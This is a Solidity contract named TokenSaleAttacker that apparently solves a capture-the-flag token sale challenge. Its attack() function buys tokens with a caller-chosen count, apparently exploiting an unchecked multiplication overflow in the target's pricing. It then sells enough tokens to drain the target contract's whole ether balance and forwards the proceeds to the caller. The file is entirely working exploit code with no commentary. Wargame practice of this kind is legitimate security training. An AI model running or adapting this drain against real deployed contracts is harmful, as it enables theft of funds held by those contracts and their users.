// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "hardhat/console.sol";

interface ITokenSale {
    function buy(uint256 numTokens) external payable;

    function sell(uint256 numTokens) external;
}

contract TokenSaleAttacker {
    ITokenSale target;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor(address _targetAddress) {
        target = ITokenSale(_targetAddress);
    }

    function getPrice(uint256 numTokens) public pure returns (uint256) {
        uint256 price = numTokens * PRICE_PER_TOKEN;
        return price;
    }

    function attack(uint256 num) public payable {
        target.buy{value: msg.value}(num);
        uint256 sellnum = address(target).balance / 1 ether;
        target.sell(sellnum);

        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
        require(success, "Couldn't Transfer");
    }

    receive() external payable {}
}
